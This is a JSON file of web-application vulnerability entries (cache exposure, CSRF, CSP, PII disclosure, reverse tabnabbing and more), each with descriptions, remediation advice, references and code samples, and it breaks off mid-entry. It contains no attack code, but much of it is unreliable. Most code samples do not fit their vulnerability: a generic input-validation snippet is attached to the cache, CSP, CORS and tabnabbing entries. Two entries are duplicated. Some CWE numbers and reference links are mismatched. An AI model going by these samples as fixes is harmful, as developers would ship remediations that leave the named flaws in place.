  {
    "pluginId": 10050,
    "title": "Retrieved from Cache",
    "defaultRisk": "Medium",
    "cweid": 538,
    "description": "Retrieved from cache vulnerability occurs when sensitive information is stored in intermediate caches and can be accessed by unauthorized users. This vulnerability exposes confidential data, user sessions, personal information, and sensitive application content through improper caching configurations.",
    "simplified_description": "Your website is storing sensitive information in public caches, like leaving confidential documents in a public library where anyone can access them. When users access private or sensitive content, copies get saved in various cache systems that other users might accidentally access.",
    "solution": "Implement proper cache control headers to prevent caching of sensitive content, ensure private data is never stored in shared caches, and configure caching policies based on content sensitivity.",
    "simplified_solution": "Immediately add cache control headers to prevent sensitive information from being cached. Use 'Cache-Control: private, no-store' for sensitive pages, implement proper authentication-based caching, and configure CDN and proxy cache rules to exclude sensitive endpoints.",
    "references": [
      {
        "name": "OWASP HTTP Cache Headers Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Cache_Headers_Cheat_Sheet.html"
      },
      {
        "name": "CWE-525: Use of Web Browser Cache Containing Sensitive Information",
        "url": "https://cwe.mitre.org/data/definitions/525.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10052,
    "title": "X-ChromeLogger-Data (XCOLD) Header Information Leak",
    "defaultRisk": "Medium",
    "cweid": 200,
    "description": "X-ChromeLogger-Data (XCOLD) header information leak occurs when applications in production environments expose debugging information through the X-ChromeLogger-Data HTTP response header. This header is used by ChromeLogger, a Google Chrome extension for debugging PHP applications, and contains sensitive application data including variable values, stack traces, database queries, error messages, and potentially Personally Identifiable Information (PII). When exposed in production, this debugging data provides attackers with valuable insights into application internals, facilitating targeted attacks and information disclosure.",
    "simplified_description": "Your application is leaking sensitive debugging information through special HTTP headers, like leaving detailed blueprints and internal documents scattered around your building. This X-ChromeLogger-Data header contains debug information meant for developers during development, including error details, database queries, and internal variable values. Attackers can use this information to understand how your application works, find vulnerabilities, and craft targeted attacks against your system.",
    "solution": "Remove all ChromeLogger debugging functionality from production environments and implement proper environment-based configuration management.",
    "simplified_solution": "Immediately disable ChromeLogger in production by removing or commenting out ChromeLogger initialization code, ensure debugging headers are never sent in production, implement proper environment configuration to separate development and production settings, and add automated checks to prevent debugging tools from reaching production deployments.",
    "references": [
      {
        "name": "OWASP Information Exposure",
        "url": "https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration/"
      },
      {
        "name": "CWE-200: Information Exposure",
        "url": "https://cwe.mitre.org/data/definitions/200.html"
      },
      {
        "name": "ChromeLogger Documentation",
        "url": "https://craig.is/writing/chrome-logger"
      },
      {
        "name": "OWASP Secure Coding Practices",
        "url": "https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Set essential security headers",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ADD THESE HEADERS:\nres.set({\n  'X-Content-Type-Options': 'nosniff',\n  'X-Frame-Options': 'DENY',\n  'X-XSS-Protection': '1; mode=block'\n});"
      }
    ]
  },
  {
    "pluginId": 10054,
    "title": "Absence of Anti-CSRF Tokens",
    "defaultRisk": "High",
    "cweid": "352",
    "description": "Cross-Site Request Forgery (CSRF) vulnerabilities occur when a web application does not properly verify that a request originated from an authenticated user, allowing attackers to execute unauthorized actions on behalf of the victim.",
    "simplified_description": "Your website has a critical security flaw that allows attackers to trick authenticated users into performing actions they didn't intend to make. This is like someone forging your signature on important documents - attackers can make your users change passwords, transfer money, or delete data without their knowledge by simply visiting a malicious website while logged into your application.",
    "solution": "Implement CSRF protection tokens on all state-changing requests and validate them server-side.",
    "simplified_solution": "Add unique, unpredictable tokens to all forms and AJAX requests that change data. These tokens should be generated by the server, tied to user sessions, and validated before processing any sensitive operations. Never trust that requests from authenticated users are legitimate without proper CSRF protection.",
    "references": [
      {
        "name": "OWASP CSRF Prevention Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Request_Forgery_Prevention_Cheat_Sheet.html"
      },
      {
        "name": "CWE-352: Cross-Site Request Forgery (CSRF)",
        "url": "https://cwe.mitre.org/data/definitions/352.html"
      },
      {
        "name": "OWASP Top Ten A01:2021 - Broken Access Control",
        "url": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Implement CSRF tokens for state-changing operations",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// SECURE:\napp.use(csrf());\napp.post('/api/data', (req, res) => {\n  res.cookie('XSRF-TOKEN', req.csrfToken());\n});"
      },
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Implement CSRF tokens for state-changing operations",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// SECURE:\napp.use(csrf());\napp.post('/api/data', (req, res) => {\n  res.cookie('XSRF-TOKEN', req.csrfToken());\n});"
      }
    ]
  },
  {
    "pluginId": 10055,
    "title": "Content Security Policy (CSP) Analysis and Validation",
    "defaultRisk": "Medium",
    "cweid": "693",
    "description": "Content Security Policy (CSP) vulnerabilities occur when CSP implementations are misconfigured, overly permissive, or contain security weaknesses that can be bypassed by attackers. This includes policies that allow unsafe-inline, use weak source lists, lack proper reporting mechanisms, or have syntax errors that weaken security controls.",
    "simplified_description": "Your website's Content Security Policy (CSP) - which acts as a security guard for your content - has weaknesses that attackers can exploit. Think of it like having security rules but with loopholes that criminals know how to bypass. Attackers can inject malicious scripts, steal data, or perform other attacks by finding gaps in your CSP configuration.",
    "solution": "Implement a properly configured Content Security Policy that is restrictive, follows security best practices, includes monitoring and reporting, and is regularly tested for effectiveness and bypass vulnerabilities.",
    "simplified_solution": "Fix your Content Security Policy by removing unsafe permissions like 'unsafe-inline', using specific domain whitelists instead of wildcards, adding nonce or hash-based script execution controls, implementing violation reporting, and regularly testing for security gaps.",
    "references": [
      {
        "name": "OWASP Content Security Policy Cheat Sheet",
        "url": "https://owasp.org/www-project-cheat-sheets/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"
      },
      {
        "name": "MDN CSP Documentation",
        "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
      },
      {
        "name": "CSP Evaluator by Google",
        "url": "https://csp-evaluator.withgoogle.com/"
      },
      {
        "name": "CSP Specification - W3C",
        "url": "https://www.w3.org/TR/CSP/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate all input data structure and format",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// VALIDATE USER INPUT:\nconst schema = Joi.object({\n  email: Joi.string().email().required(),\n  age: Joi.number().min(1).max(120).required()\n});\n\nconst { error } = schema.validate(req.body);\nif (error) return res.status(400).send(error.details[0].message);"
      }
    ]
  },
  {
    "pluginId": 10056,
    "title": "Content Security Policy (CSP) Analysis and Validation",
    "defaultRisk": "Medium",
    "cweid": "693",
    "description": "Content Security Policy (CSP) vulnerabilities occur when CSP implementations are misconfigured, overly permissive, or contain security weaknesses that can be bypassed by attackers. This includes policies that allow unsafe-inline, use weak source lists, lack proper reporting mechanisms, or have syntax errors that weaken security controls.",
    "simplified_description": "Your website's Content Security Policy (CSP) - which acts as a security guard for your content - has weaknesses that attackers can exploit. Think of it like having security rules but with loopholes that criminals know how to bypass. Attackers can inject malicious scripts, steal data, or perform other attacks by finding gaps in your CSP configuration.",
    "solution": "Implement a properly configured Content Security Policy that is restrictive, follows security best practices, includes monitoring and reporting, and is regularly tested for effectiveness and bypass vulnerabilities.",
    "simplified_solution": "Fix your Content Security Policy by removing unsafe permissions like 'unsafe-inline', using specific domain whitelists instead of wildcards, adding nonce or hash-based script execution controls, implementing violation reporting, and regularly testing for security gaps.",
    "references": [
      {
        "name": "OWASP Content Security Policy Cheat Sheet",
        "url": "https://owasp.org/www-project-cheat-sheets/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"
      },
      {
        "name": "MDN CSP Documentation",
        "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
      },
      {
        "name": "CSP Evaluator by Google",
        "url": "https://csp-evaluator.withgoogle.com/"
      },
      {
        "name": "CSP Specification - W3C",
        "url": "https://www.w3.org/TR/CSP/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate all input data structure and format",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// VALIDATE USER INPUT:\nconst schema = Joi.object({\n  email: Joi.string().email().required(),\n  age: Joi.number().min(1).max(120).required()\n});\n\nconst { error } = schema.validate(req.body);\nif (error) return res.status(400).send(error.details[0].message);"
      }
    ]
  },
  {
    "pluginId": 10057,
    "title": "Username Hash Found",
    "defaultRisk": "Medium",
    "cweid": "200",
    "description": "Username hash disclosure vulnerabilities occur when applications expose hashed usernames or predictable user identifiers in URLs, forms, or responses, allowing attackers to enumerate users, gather intelligence about the user base, and potentially reverse-engineer user identification systems.",
    "simplified_description": "Your application is exposing user identification patterns that allow attackers to discover valid usernames and account information, like publishing a partial employee directory that helps outsiders identify who works at your company. This enables attackers to build targeted attacks, guess passwords for known accounts, and harvest user data for social engineering campaigns.",
    "solution": "Remove username hashes from publicly accessible areas and implement proper user enumeration protection with secure identification methods.",
    "simplified_solution": "Eliminate username exposure in URLs, API responses, and form fields. Replace predictable user IDs with random UUIDs, implement proper access controls that hide user existence from unauthorized users, and add rate limiting to prevent username enumeration attacks. Ensure user discovery requires proper authentication and authorization.",
    "references": [
      {
        "name": "OWASP User Enumeration Prevention",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
      },
      {
        "name": "CWE-200: Information Exposure",
        "url": "https://cwe.mitre.org/data/definitions/200.html"
      },
      {
        "name": "OWASP Testing Guide: User Enumeration",
        "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Authentication_Testing/04-Testing_for_User_Enumeration_and_Guessable_User_Account.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10058,
    "title": "GET for POST",
    "defaultRisk": "Medium",
    "cweid": "302",
    "description": "The application uses HTTP GET method for operations that should be performed using POST. This violates REST principles and can lead to security vulnerabilities since GET requests can be cached, bookmarked, and stored in browser history, potentially exposing sensitive operations and parameters.",
    "simplified_description": "Your application is using the wrong HTTP method for sensitive operations. GET requests are meant for retrieving data and are visible in browser history, URLs, and can be cached. When used for actions like changing data or making purchases, these sensitive operations can be accidentally repeated or triggered by browser crawlers, leading to unauthorized actions or duplicate transactions.",
    "solution": "Change sensitive operations from GET to POST requests and implement proper anti-CSRF protection.",
    "simplified_solution": "Update your application to use POST, PUT, or DELETE methods for actions that change data. Add CSRF tokens to forms and validate them on the server. This prevents accidental actions and protects against cross-site request forgery attacks.",
    "references": [
      {
        "name": "OWASP CSRF Prevention",
        "url": "https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross_Site_Request_Forgery_Prevention_Cheat_Sheet.html"
      },
      {
        "name": "CWE-302: Authentication Bypass by Assumed-Immutable Data",
        "url": "https://cwe.mitre.org/data/definitions/302.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10061,
    "title": "Permissions-Policy Header Not Set",
    "defaultRisk": "Medium",
    "cweid": 1021,
    "description": "The Permissions-Policy header (formerly Feature-Policy) is not implemented, allowing unrestricted access to powerful browser features such as camera, microphone, geolocation, payment APIs, and other sensitive capabilities. This lack of granular control can lead to privacy violations, unauthorized data collection, and exploitation of browser APIs for malicious purposes.",
    "simplified_description": "Your website is missing important security controls that manage what browser features can be used, like leaving your home with all doors and windows unlocked. Without these restrictions, malicious websites can potentially access your users' camera, microphone, location, payment information, and other sensitive browser capabilities without their knowledge or consent.",
    "solution": "Implement comprehensive Permissions-Policy headers to explicitly control which browser features are available on your site. Use a whitelist approach to only enable features that are necessary for your application functionality, and disable all potentially dangerous features that are not required.",
    "simplified_solution": "Add a security header to your web server configuration that tells browsers exactly which features your website can use, like camera, microphone, location, and payment APIs. Only enable features that your application actually needs, and block everything else to protect user privacy and prevent misuse of browser capabilities.",
    "references": [
      {
        "name": "MDN Web Docs - Permissions-Policy",
        "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy"
      },
      {
        "name": "OWASP Permissions-Policy Security Guide",
        "url": "https://owasp.org/www-project-secure-headers/#permissions-policy"
      },
      {
        "name": "Google Web Fundamentals - Feature Policy",
        "url": "https://web.dev/feature-policy/"
      },
      {
        "name": "CWE-1021: Improper Restriction of Rendered UI Layers or Frames",
        "url": "https://cwe.mitre.org/data/definitions/1021.html"
      },
      {
        "name": "W3C Permissions Policy Specification",
        "url": "https://w3c.github.io/webappsec-permissions-policy/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Set essential security headers",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ADD THESE HEADERS:\nres.set({\n  'X-Content-Type-Options': 'nosniff',\n  'X-Frame-Options': 'DENY',\n  'X-XSS-Protection': '1; mode=block'\n});"
      }
    ]
  },
  {
    "pluginId": 10062,
    "title": "PII Disclosure",
    "defaultRisk": "High",
    "cweid": 532,
    "description": "PII (Personally Identifiable Information) disclosure occurs when applications expose sensitive personal data through various channels including error messages, debug information, API responses, logs, or insufficient data protection measures. This vulnerability can lead to privacy breaches, identity theft, regulatory violations, and reputational damage.",
    "simplified_description": "Your application is accidentally exposing people's personal information like names, email addresses, phone numbers, or even more sensitive data. This is like having a clerk at a doctor's office reading patient files out loud in the waiting room - private information that should be protected is being shared where anyone can see it. Attackers can collect this data for identity theft, spam, or other malicious purposes.",
    "solution": "Implement comprehensive data protection measures including data classification, encryption, access controls, input validation, output encoding, and proper error handling to prevent PII exposure.",
    "simplified_solution": "1) Identify all PII in your application and classify it by sensitivity level 2) Implement strong encryption for stored and transmitted PII 3) Add proper access controls so only authorized users can see personal data 4) Sanitize all error messages to remove sensitive information 5) Use data masking/redaction in logs and debug outputs 6) Implement proper session management and authentication 7) Regular security testing to catch accidental PII leaks.",
    "references": [
      {
        "name": "OWASP Top Ten A01:2021 - Broken Access Control",
        "url": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
      },
      {
        "name": "CWE-532: Insertion of Sensitive Information into Log File",
        "url": "https://cwe.mitre.org/data/definitions/532.html"
      },
      {
        "name": "CWE-200: Information Exposure",
        "url": "https://cwe.mitre.org/data/definitions/200.html"
      },
      {
        "name": "GDPR Compliance Guide",
        "url": "https://gdpr.eu/"
      },
      {
        "name": "NIST Privacy Framework",
        "url": "https://www.nist.gov/itl/executive-order-13990-promoting-american-cybersecurity-competence"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10096,
    "title": "Timestamp Disclosure",
    "defaultRisk": "Low",
    "cweid": 200,
    "description": "Timestamp Disclosure occurs when web applications expose server timestamps in HTTP headers, error messages, or application responses, potentially revealing system information that attackers can use for reconnaissance or timing attacks.",
    "simplified_description": "Your application is revealing server timestamps, like posting the exact time your security system was last updated on a public notice board. These timestamps help attackers understand your server's configuration and plan targeted attacks.",
    "solution": "Remove or sanitize timestamp information from HTTP headers, error messages, and application responses. Configure servers to minimize information disclosure.",
    "simplified_solution": "Configure your web server and application to stop exposing timestamps. Disable server signatures, remove date headers from error pages, and implement proper logging without exposing sensitive timing information to users.",
    "references": [
      {
        "name": "OWASP Information Leakage Prevention",
        "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10097,
    "title": "Hash Disclosure",
    "defaultRisk": "Medium",
    "cweid": "200",
    "description": "Hash disclosure vulnerabilities occur when cryptographic hashes are exposed in client-side code, error messages, or API responses. This can lead to hash cracking, password discovery, and unauthorized access to sensitive data.",
    "simplified_description": "Your application is exposing cryptographic hashes that attackers can potentially crack to reveal original sensitive information like passwords. This is like finding encrypted password clues that hackers can use with specialized tools to decode and gain unauthorized access to user accounts or sensitive data.",
    "solution": "Remove hash exposure, implement proper cryptographic storage practices, and ensure no sensitive hash values are transmitted to clients or logged inappropriately.",
    "simplified_solution": "Never expose password hashes or sensitive cryptographic hashes in API responses, client-side code, or error messages. Use strong, salted hashing algorithms like bcrypt or Argon2 for passwords, implement proper API response sanitization, and secure your logging practices to prevent hash leakage.",
    "references": [
      {
        "name": "OWASP Password Storage Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html"
      },
      {
        "name": "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor",
        "url": "https://cwe.mitre.org/data/definitions/200.html"
      },
      {
        "name": "NIST Special Publication 800-63B",
        "url": "https://pages.nist.gov/800-63-3/sp800-63b.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10098,
    "title": "Cross-Domain Misconfiguration",
    "defaultRisk": "Medium",
    "cweid": 942,
    "description": "Cross-domain misconfiguration vulnerabilities occur when applications have overly permissive cross-origin policies, allowing unauthorized domains to make requests, access sensitive data, or perform actions on behalf of users across different domains.",
    "simplified_description": "Your application is allowing websites from other domains to communicate with it without proper restrictions, like giving your house keys to strangers from other neighborhoods. Attackers can use overly permissive cross-domain policies to steal user data, perform unauthorized actions, or bypass security controls by making requests from malicious websites.",
    "solution": "Implement strict Cross-Origin Resource Sharing (CORS) policies, validate Origin headers, use proper authentication for cross-origin requests, and avoid overly permissive wildcard (*) CORS configurations.",
    "simplified_solution": "Configure strict CORS policies that only allow specific trusted domains to make cross-origin requests to your API. Always validate the Origin header, require authentication for sensitive cross-origin operations, and avoid using wildcard (*) CORS settings. Use preflight requests for complex operations and implement proper CSRF protection alongside CORS controls.",
    "references": [
      {
        "name": "OWASP CORS Security Guide",
        "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_Cross_Origin_Resource_Sharing/"
      },
      {
        "name": "CWE-942: Overly Permissive Cross-Domain Whitelist",
        "url": "https://cwe.mitre.org/data/definitions/942.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10104,
    "title": "User Agent Fuzzer",
    "defaultRisk": "Medium",
    "cweid": 129,
    "description": "User Agent Fuzzer vulnerability occurs when applications fail to properly validate, sanitize, and handle User-Agent HTTP header input, allowing attackers to inject malicious payloads, bypass security controls, or exploit application logic through crafted User-Agent strings. This vulnerability can lead to various attacks including injection attacks, authentication bypass, privilege escalation, and information disclosure. The User-Agent header, while seemingly innocuous, is often processed by application logic for browser detection, capability assessment, logging, and security controls, making it a potential attack vector when not properly secured.",
    "simplified_description": "Your application doesn't properly handle the User-Agent information that browsers send with every request. This is like having a receptionist who accepts any visitor identification without checking if it's legitimate. Attackers can send fake User-Agent strings containing malicious code or special characters that can confuse your application, bypass security checks, steal information, or even take control of parts of your system.",
    "solution": "Implement strict input validation, sanitization, and secure handling of User-Agent headers with comprehensive filtering and protection mechanisms.",
    "simplified_solution": "Add strict validation to check User-Agent input for dangerous characters and patterns, limit User-Agent length to reasonable sizes, encode or escape User-Agent data before using it, implement allowlist-based browser detection instead of parsing arbitrary strings, and set up monitoring to detect unusual User-Agent patterns that might indicate attacks.",
    "references": [
      {
        "name": "OWASP Input Validation",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html"
      },
      {
        "name": "CWE-129: Improper Validation of Array Index",
        "url": "https://cwe.mitre.org/data/definitions/129.html"
      },
      {
        "name": "User Agent Security Best Practices",
        "url": "https://portswigger.net/web-security/attacks"
      },
      {
        "name": "HTTP Header Security",
        "url": "https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10105,
    "title": "Weak Authentication Method",
    "defaultRisk": "Medium",
    "cweid": "287",
    "description": "The application uses weak authentication mechanisms such as Basic Authentication without HTTPS, hardcoded credentials, predictable session tokens, or insufficient password policies. These weaknesses allow attackers to easily compromise user accounts through credential theft, brute force attacks, or session hijacking.",
    "simplified_description": "Your application has weak security for logging in, like using a simple lock that can be easily picked or having a password system that's too easy to guess. Attackers can break into user accounts, steal personal information, and take over the system.",
    "solution": "Implement strong multi-factor authentication, use HTTPS for all authentication, enforce robust password policies, implement proper session management, and add protection against brute force attacks and credential stuffing.",
    "simplified_solution": "Enable HTTPS for all login processes, require strong passwords with complexity rules, add multi-factor authentication (like SMS codes or authenticator apps), implement account lockout after failed attempts, and use secure session management.",
    "references": [
      {
        "name": "OWASP Authentication Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
      },
      {
        "name": "CWE-287: Improper Authentication",
        "url": "https://cwe.mitre.org/data/definitions/287.html"
      },
      {
        "name": "NIST SP 800-63B: Digital Identity Guidelines",
        "url": "https://pages.nist.gov/800-63-3/sp800-63b.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Always hash passwords with strong algorithms",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// SECURE LOGIN:\nconst hashedPassword = await bcrypt.hash(password, 12);\nconst isValid = await bcrypt.compare(inputPassword, storedHash);\n\n// NEVER: store plain text passwords"
      }
    ]
  },
  {
    "pluginId": 10108,
    "title": "Reverse Tabnabbing",
    "defaultRisk": "Medium",
    "cweid": "1021",
    "description": "The application contains links that open new windows/tabs without proper rel attributes, making it vulnerable to reverse tabnabbing attacks. This allows malicious sites to take control of the original tab when a user clicks back, potentially leading to phishing attacks.",
    "simplified_description": "Your website has links that open new tabs without proper security protection. This vulnerability allows malicious websites to hijack the original tab when users click back to it. Attackers can replace your website with a fake login page to steal user credentials - it's like someone changing the sign on your office door while you're away.",
    "solution": "Add proper rel attributes (noopener and noreferrer) to all external links and implement Content Security Policy headers for additional protection.",
    "simplified_solution": "Add rel=\"noopener noreferrer\" to all external links, use target=\"_blank\" safely, implement CSP headers to restrict window.opener access, and consider using link sanitization in your framework.",
    "references": [
      {
        "name": "OWASP HTML5 Security Cheat Sheet",
        "url": "https://owasp.org/www-project-cheat-sheets/cheatsheets/HTML5_Security_Cheat_Sheet.html"
      },
      {
        "name": "CWE-1021: Improper Restriction of Rendered UI Layers or Frames",
        "url": "https://cwe.mitre.org/data/definitions/1021.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10109,
    "title": "Modern Web Application",
    "defaultRisk": "Low",
    "cweid": 200,
    "description": "Modern Web Application disclosure occurs when applications expose framework information, technology stack details, or development tooling through HTTP headers, meta tags, or response patterns, potentially revealing attack surface information to malicious actors.",
    "simplified_description": "Your website is advertising what technologies and frameworks it's built with, like putting up signs telling burglars exactly what security system you use. This information helps attackers research specific vulnerabilities in your technology stack.",
    "solution": "Remove or obfuscate framework identifiers, technology stack information, and development tooling signatures from HTTP headers, meta tags, and application responses.",
    "simplified_solution": "Configure your application and web server to stop revealing technology stack information. Remove framework headers, disable development mode indicators, implement generic error pages, and use security headers to prevent information disclosure.",
    "references": [
      {
        "name": "Framework Security Best Practices",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Framework_Security_Cheat_Sheet.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10111,
    "title": "Authentication Request Identified",
    "defaultRisk": "Low",
    "cweid": "200",
    "description": "Authentication request identification occurs when applications expose information about authentication mechanisms, credentials formats, or security patterns through error messages, response structures, or network traffic analysis, potentially assisting attackers in crafting targeted attacks.",
    "simplified_description": "Your application is revealing information about how your authentication system works, like showing attackers the exact type and format of locks you use on your doors. This information helps attackers understand your security patterns, discover valid usernames, and develop more effective attacks against your authentication system.",
    "solution": "Implement generic error messages and consistent responses that don't reveal authentication mechanisms or account status information.",
    "simplified_solution": "Use generic, identical error messages for all authentication failures regardless of the reason. Don't reveal whether usernames exist, passwords are incorrect, or accounts are locked. Implement consistent response times for all authentication attempts. Use secure redirects and avoid exposing authentication details in URLs or responses.",
    "references": [
      {
        "name": "OWASP Authentication Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
      },
      {
        "name": "CWE-200: Information Exposure",
        "url": "https://cwe.mitre.org/data/definitions/200.html"
      },
      {
        "name": "OWASP Testing Guide: Authentication Testing",
        "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Authentication_Testing/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Always hash passwords with strong algorithms",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// SECURE LOGIN:\nconst hashedPassword = await bcrypt.hash(password, 12);\nconst isValid = await bcrypt.compare(inputPassword, storedHash);\n\n// NEVER: store plain text passwords"
      }
    ]
  },
  {
    "pluginId": 10112,
    "title": "Session Management Response Identified",
    "defaultRisk": "Medium",
    "cweid": "200",
    "description": "Session management response identification vulnerabilities occur when applications expose session-related information in responses, headers, or error messages, revealing session handling mechanisms, session state information, or authentication status that can assist attackers in session hijacking or manipulation attacks.",
    "simplified_description": "Your application is revealing information about how it manages user sessions, like exposing the internal wiring and control systems of your building's security. This information helps attackers understand your session management patterns, identify active sessions, and develop targeted session hijacking or fixation attacks against your users.",
    "solution": "Implement secure session handling that prevents session information disclosure through headers, responses, or error messages.",
    "simplified_solution": "Remove session identifiers from URLs, headers, and responses. Use secure, HttpOnly cookies for session management. Implement proper session validation without revealing session state. Use generic error messages that don't disclose session-related information. Ensure all session management operations happen server-side with minimal client-side exposure.",
    "references": [
      {
        "name": "OWASP Session Management Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"
      },
      {
        "name": "CWE-200: Information Exposure",
        "url": "https://cwe.mitre.org/data/definitions/200.html"
      },
      {
        "name": "OWASP Testing Guide: Session Management Testing",
